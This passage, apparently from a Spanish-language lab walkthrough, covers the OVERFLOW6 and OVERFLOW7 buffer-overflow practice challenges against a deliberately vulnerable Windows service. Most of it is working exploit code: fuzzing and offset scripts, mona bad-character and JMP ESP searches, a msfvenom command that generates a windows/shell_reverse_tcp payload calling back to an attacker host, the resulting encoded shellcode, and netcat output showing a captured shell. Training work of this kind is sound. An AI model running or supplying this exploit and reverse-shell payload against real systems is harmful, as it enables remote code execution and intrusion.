\u0026#34;\\xfe\\x7c\\xde\\x44\\x01\\x7f\\x1f\\x4d\\xc6\\x2b\\x4f\\xe5\\xef\\x53\\x04\u0026#34; \u0026#34;\\xf5\\x10\\x86\\x8b\\xa5\\xbe\\x79\\x6c\\x15\\x7f\\x2a\\x04\\x7f\\x70\\x15\u0026#34; \u0026#34;\\x34\\x80\\x5a\\x3e\\xdf\\x7b\\x0d\\x81\\x88\\x95\\xcc\\x69\\xcb\\x99\\xcb\u0026#34; \u0026#34;\\x53\\x42\\x7f\\xb9\\xb3\\x02\\x28\\x56\\x2d\\x0f\\xa2\\xc7\\xb2\\x85\\xcf\u0026#34; \u0026#34;\\xc8\\x39\\x2a\\x30\\x86\\xc9\\x47\\x22\\x7f\\x3a\\x12\\x18\\xd6\\x45\\x88\u0026#34; \u0026#34;\\x34\\xb4\\xd4\\x57\\xc4\\xb3\\xc4\\xcf\\x93\\x94\\x3b\\x06\\x71\\x09\\x65\u0026#34; \u0026#34;\\xb0\\x67\\xd0\\xf3\\xfb\\x23\\x0f\\xc0\\x02\\xaa\\xc2\\x7c\\x21\\xbc\\x1a\u0026#34; \u0026#34;\\x7c\\x6d\\xe8\\xf2\\x2b\\x3b\\x46\\xb5\\x85\\x8d\\x30\\x6f\\x79\\x44\\xd4\u0026#34; \u0026#34;\\xf6\\xb1\\x57\\xa2\\xf6\\x9f\\x21\\x4a\\x46\\x76\\x74\\x75\\x67\\x1e\\x70\u0026#34; \u0026#34;\\x0e\\x95\\xbe\\x7f\\xc5\\x1d\\xde\\x9d\\xcf\\x6b\\x77\\x38\\x9a\\xd1\\x1a\u0026#34; \u0026#34;\\xbb\\x71\\x15\\x23\\x38\\x73\\xe6\\xd0\\x20\\xf6\\xe3\\x9d\\xe6\\xeb\\x99\u0026#34; \u0026#34;\\x8e\\x82\\x0b\\x0d\\xae\\x86\u0026#34;) eip_ret = pack(\u0026#34;\u0026lt;L\u0026#34;,0x62501203) nops = \u0026#34;\\x90\u0026#34; * 16 padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 1034 + eip_ret + nops + badchars + padding * (1534 - 1034 - 4 - 255) # 255 badchars buff = \u0026#34;A\u0026#34; * 1274 + eip_ret + nops + shellcode + padding * (1750 - 1274 - 4 - 16 - 353) try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW6 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) Tras ejecutar el script logramos obtener una shell.\n1 2 3 4 5 6 7 8 9 10 11 ➜ BuffTHM nc -lnvp 1338 Listening on 0.0.0.0 1338 Connection received on 192.168.22.128 49182 Microsoft Windows [Versin 6.1.7601] Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos. C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\u0026gt;echo %username% echo %username% sckull C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\u0026gt; Overflow 7 Fuzzing Realizamos fuzzing al segundo reto utilizando esta vez OVERFLOW7.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 #!/usr/bin/python2.7 import socket, sys from pwn import * from struct import pack if len(sys.argv) != 2: print(\u0026#34;[*] Run:\\n\\toscp1.py \u0026lt;IP-address\u0026gt;\u0026#34;) sys.exit(1) address = sys.argv[1] port = 1337 buff = [\u0026#34;A\u0026#34;] c = 100 while len(buff) \u0026lt; 30: buff.append(\u0026#34;A\u0026#34;*c) c += 100 p1 = log.progress(\u0026#34;Progreso\u0026#34;) for string in buff: try: p1.status(\u0026#34;Enviando %s bytes.\u0026#34; % len(string)) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW7 %s\\r\\n\u0026#34; % string) s.close() #log.info(\u0026#34;x_x socket.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo con %s bytes.\u0026#34; % len(string)) sys.exit(1) Encontramos que el programa se detuvo con 1400 bytes.\n1 2 3 4 ➜ OVERFLOW_7 ./overflow7.py 192.168.22.128 [\u0026gt;] Progreso: Enviando 1400 bytes. [-] Parece que el programa se detuvo con 1400 bytes. ➜ OVERFLOW_7 Observamos que el registro EIP se sobreescribió con “A\u0026quot;s, tambien vemos el registro ESP con los mismos valores.\nOffset EIP Creamos un patron de 1500 bytes utilizando pattern_create.rb.\n1 2 3 ┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit] └─$ ./pattern_create.rb -l 1500 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9 Modificamos el script para realizar el envio de este.\n1 2 3 4 5 6 7 8 9 10 11 12 13 buff = \u0026#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9\u0026#34; try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW7 %s\\r\\n\u0026#34; % buff) s.close() #log.info(\u0026#34;x_x socket.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34;) El registro EIP está lleno con el patron enviado asi mismo el registro ESP.\nMona nos muestra el offset con valor de 1306 bytes.\n1 2 3 4 5 6 7 8 9 # !mona findmsp -distance 1500 [+] Command used: !mona findmsp -distance 1500 [..] [+] Examining registers EIP contains normal pattern : 0x72423572 (offset 1306) ESP (0x0090fa30) points at offset 1310 in normal pattern (length 190) EBP contains normal pattern : 0x42347242 (offset 1302) EBX contains normal pattern : 0x33724232 (offset 1298) Control EIP Utilizando la longitud del offset agregamos “B\u0026quot;s para confirmar que el offset es exacto y que tenemos el control del registro EIP, además agregamos un padding para mantener la longitud del buffer (1500).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 eip_ret = \u0026#34;B\u0026#34; * 4 nops = \u0026#34;\u0026#34; padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 1306 + eip_ret + nops + padding * (1500-1306-4) # junk 1306, eip 4, padding 190 = 1500 try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW7 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) Tras ejecutar el script vemos que el registro EIP contiene “B\u0026quot;s lo que significa que el offset es exacto, además vemos el registro ESP con el padding (“C\u0026quot;s).\nEspacio - Shellcode Aumentamos el padding para tener asegurado un espacio ‘decente’ para nuestro shellcode, en este caso 250 bytes adicionales, en total tendríamos 440 bytes disponibles.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 eip_ret = \u0026#34;B\u0026#34; * 4 nops = \u0026#34;\u0026#34; # 16 bytes padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 1306 + eip_ret + nops + padding * (1500 - 1306 - 4 + 250) # 440 padding # 1306 junk, 4 eip_ret, padding 440 (shellcode + nops) # total buffer = 1750 try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW7 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) El debugger muestra el mismo comportamiento por lo que tomamos la longitud del buffer en 1750 bytes de los cuales 440 bytes serán para el shellcode y los nops (16 bytes).\nBadChars Generamos con mona un array con todos los badchars exeptuando el valor null (\\x00).\n1 !mona bytearray -cpb \u0026#34;\\x00\u0026#34; Modificamos el script con nuestro array de badchars.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 badchars = (\u0026#34;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\u0026#34; \u0026#34;\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\u0026#34; \u0026#34;\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\u0026#34; \u0026#34;\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\u0026#34; \u0026#34;\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\u0026#34; \u0026#34;\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\u0026#34; \u0026#34;\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\u0026#34; \u0026#34;\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\u0026#34;) eip_ret = \u0026#34;B\u0026#34; * 4 nops = \u0026#34;\u0026#34; # 16 bytes padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 1306 + eip_ret + nops + badchars + padding * (1750 - 1306 - 4 - 255) # 255 badchars try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW7 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) Realizamos la busqueda de badchars como en el primer reto. Inicialmente encontramos los badchars \u0026quot;\\x00\\x8c\\xae\\xbe\\xfb\u0026quot;.\n1 \\x00\\x8c\\xae\\xbe\\xfb JMP ESP Buscamos una instrucción de salto al ESP con mona.\n1 2 !mona find -s \u0026#39;jmp esp\u0026#39; -type instr -cm aslr=false,rebase=false,nx=false -cpb \u0026#34;\\x00\\x8c\\xae\\xbe\\xfb\u0026#34; !mona jmp -r esp -cpb \u0026#34;\\x00\\x8c\\xae\\xbe\\xfb\u0026#34; Encontramos dos direcciones de memoria con la instrucción jmp esp sin ningun tipo de protección.\n1 2 3 4 5 6 7 8 9 10 11 12 13 [+] Command used: !mona find -s \u0026#39;jmp esp\u0026#39; -type instr -cm aslr=false,rebase=false,nx=false -cpb \u0026#34;\\x00\\x8c\\xae\\xbe\\xfb\u0026#34; [+] Results : 0x625011af : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011bb : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011c7 : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011d3 : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011df : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011eb : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011f7 : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x62501203 : \u0026#39;jmp esp\u0026#39; | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x62501205 : \u0026#39;jmp esp\u0026#39; | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) Found a total of 9 pointers Modificamos nuestr script agregando la dirección de la instrucción.\n1 2 3 from struct import pack eip_ret = pack(\u0026#34;\u0026lt;L\u0026#34;,0x625011eb) Shellcode Creamos nuestro shellcode pasandole los badchars que encontramos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 ┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit] └─$ msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.22.1 LPORT=1338 -a x86 --platform windows -f c -b \u0026#34;\\x00\\x8c\\xae\\xbe\\xfb\u0026#34; Found 11 compatible encoders Attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai failed with A valid opcode permutation could not be found. Attempting to encode payload with 1 iterations of generic/none generic/none failed with Encoding failed due to a bad character (index=3, char=0x00) Attempting to encode payload with 1 iterations of x86/call4_dword_xor x86/call4_dword_xor succeeded with size 348 (iteration=0) x86/call4_dword_xor chosen with final size 348 Payload size: 348 bytes Final size of c file: 1488 bytes unsigned char buf[] = \u0026#34;\\x33\\xc9\\x83\\xe9\\xaf\\xe8\\xff\\xff\\xff\\xff\\xc0\\x5e\\x81\\x76\\x0e\u0026#34; \u0026#34;\\xc3\\x2d\\x3d\\x1c\\x83\\xee\\xfc\\xe2\\xf4\\x3f\\xc5\\xbf\\x1c\\xc3\\x2d\u0026#34; \u0026#34;\\x5d\\x95\\x26\\x1c\\xfd\\x78\\x48\\x7d\\x0d\\x97\\x91\\x21\\xb6\\x4e\\xd7\u0026#34; \u0026#34;\\xa6\\x4f\\x34\\xcc\\x9a\\x77\\x3a\\xf2\\xd2\\x91\\x20\\xa2\\x51\\x3f\\x30\u0026#34; \u0026#34;\\xe3\\xec\\xf2\\x11\\xc2\\xea\\xdf\\xee\\x91\\x7a\\xb6\\x4e\\xd3\\xa6\\x77\u0026#34; \u0026#34;\\x20\\x48\\x61\\x2c\\x64\\x20\\x65\\x3c\\xcd\\x92\\xa6\\x64\\x3c\\xc2\\xfe\u0026#34; \u0026#34;\\xb6\\x55\\xdb\\xce\\x07\\x55\\x48\\x19\\xb6\\x1d\\x15\\x1c\\xc2\\xb0\\x02\u0026#34; \u0026#34;\\xe2\\x30\\x1d\\x04\\x15\\xdd\\x69\\x35\\x2e\\x40\\xe4\\xf8\\x50\\x19\\x69\u0026#34; \u0026#34;\\x27\\x75\\xb6\\x44\\xe7\\x2c\\xee\\x7a\\x48\\x21\\x76\\x97\\x9b\\x31\\x3c\u0026#34; \u0026#34;\\xcf\\x48\\x29\\xb6\\x1d\\x13\\xa4\\x79\\x38\\xe7\\x76\\x66\\x7d\\x9a\\x77\u0026#34; \u0026#34;\\x6c\\xe3\\x23\\x72\\x62\\x46\\x48\\x3f\\xd6\\x91\\x9e\\x45\\x0e\\x2e\\xc3\u0026#34; \u0026#34;\\x2d\\x55\\x6b\\xb0\\x1f\\x62\\x48\\xab\\x61\\x4a\\x3a\\xc4\\xd2\\xe8\\xa4\u0026#34; \u0026#34;\\x53\\x2c\\x3d\\x1c\\xea\\xe9\\x69\\x4c\\xab\\x04\\xbd\\x77\\xc3\\xd2\\xe8\u0026#34; \u0026#34;\\x4c\\x93\\x7d\\x6d\\x5c\\x93\\x6d\\x6d\\x74\\x29\\x22\\xe2\\xfc\\x3c\\xf8\u0026#34; \u0026#34;\\xaa\\x76\\xc6\\x45\\xfd\\xb4\\xd5\\x2c\\x55\\x1e\\xc3\\x28\\x07\\x95\\x25\u0026#34; \u0026#34;\\x47\\x2d\\x4a\\x94\\x45\\xa4\\xb9\\xb7\\x4c\\xc2\\xc9\\x46\\xed\\x49\\x10\u0026#34; \u0026#34;\\x3c\\x63\\x35\\x69\\x2f\\x45\\xcd\\xa9\\x61\\x7b\\xc2\\xc9\\xab\\x4e\\x50\u0026#34; \u0026#34;\\x78\\xc3\\xa4\\xde\\x4b\\x94\\x7a\\x0c\\xea\\xa9\\x3f\\x64\\x4a\\x21\\xd0\u0026#34; \u0026#34;\\x5b\\xdb\\x87\\x09\\x01\\x1d\\xc2\\xa0\\x79\\x38\\xd3\\xeb\\x3d\\x58\\x97\u0026#34; \u0026#34;\\x7d\\x6b\\x4a\\x95\\x6b\\x6b\\x52\\x95\\x7b\\x6e\\x4a\\xab\\x54\\xf1\\x23\u0026#34; \u0026#34;\\x45\\xd2\\xe8\\x95\\x23\\x63\\x6b\\x5a\\x3c\\x1d\\x55\\x14\\x44\\x30\\x5d\u0026#34; \u0026#34;\\xe3\\x16\\x96\\xdd\\x01\\xe9\\x27\\x55\\xba\\x56\\x90\\xa0\\xe3\\x16\\x11\u0026#34; \u0026#34;\\x3b\\x60\\xc9\\xad\\xc6\\xfc\\xb6\\x28\\x86\\x5b\\xd0\\x5f\\x52\\x76\\xc3\u0026#34; \u0026#34;\\x7e\\xc2\\xc9\u0026#34;; Agregamos nuestro shellcode y NOPs, finalmente calculamos el padding para mantener la longitud de nuestro buffer (1750).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 shellcode = (\u0026#34;\\x33\\xc9\\x83\\xe9\\xaf\\xe8\\xff\\xff\\xff\\xff\\xc0\\x5e\\x81\\x76\\x0e\u0026#34; \u0026#34;\\xc3\\x2d\\x3d\\x1c\\x83\\xee\\xfc\\xe2\\xf4\\x3f\\xc5\\xbf\\x1c\\xc3\\x2d\u0026#34; \u0026#34;\\x5d\\x95\\x26\\x1c\\xfd\\x78\\x48\\x7d\\x0d\\x97\\x91\\x21\\xb6\\x4e\\xd7\u0026#34; \u0026#34;\\xa6\\x4f\\x34\\xcc\\x9a\\x77\\x3a\\xf2\\xd2\\x91\\x20\\xa2\\x51\\x3f\\x30\u0026#34; \u0026#34;\\xe3\\xec\\xf2\\x11\\xc2\\xea\\xdf\\xee\\x91\\x7a\\xb6\\x4e\\xd3\\xa6\\x77\u0026#34; \u0026#34;\\x20\\x48\\x61\\x2c\\x64\\x20\\x65\\x3c\\xcd\\x92\\xa6\\x64\\x3c\\xc2\\xfe\u0026#34; \u0026#34;\\xb6\\x55\\xdb\\xce\\x07\\x55\\x48\\x19\\xb6\\x1d\\x15\\x1c\\xc2\\xb0\\x02\u0026#34; \u0026#34;\\xe2\\x30\\x1d\\x04\\x15\\xdd\\x69\\x35\\x2e\\x40\\xe4\\xf8\\x50\\x19\\x69\u0026#34; \u0026#34;\\x27\\x75\\xb6\\x44\\xe7\\x2c\\xee\\x7a\\x48\\x21\\x76\\x97\\x9b\\x31\\x3c\u0026#34; \u0026#34;\\xcf\\x48\\x29\\xb6\\x1d\\x13\\xa4\\x79\\x38\\xe7\\x76\\x66\\x7d\\x9a\\x77\u0026#34; \u0026#34;\\x6c\\xe3\\x23\\x72\\x62\\x46\\x48\\x3f\\xd6\\x91\\x9e\\x45\\x0e\\x2e\\xc3\u0026#34; \u0026#34;\\x2d\\x55\\x6b\\xb0\\x1f\\x62\\x48\\xab\\x61\\x4a\\x3a\\xc4\\xd2\\xe8\\xa4\u0026#34; \u0026#34;\\x53\\x2c\\x3d\\x1c\\xea\\xe9\\x69\\x4c\\xab\\x04\\xbd\\x77\\xc3\\xd2\\xe8\u0026#34; \u0026#34;\\x4c\\x93\\x7d\\x6d\\x5c\\x93\\x6d\\x6d\\x74\\x29\\x22\\xe2\\xfc\\x3c\\xf8\u0026#34; \u0026#34;\\xaa\\x76\\xc6\\x45\\xfd\\xb4\\xd5\\x2c\\x55\\x1e\\xc3\\x28\\x07\\x95\\x25\u0026#34; 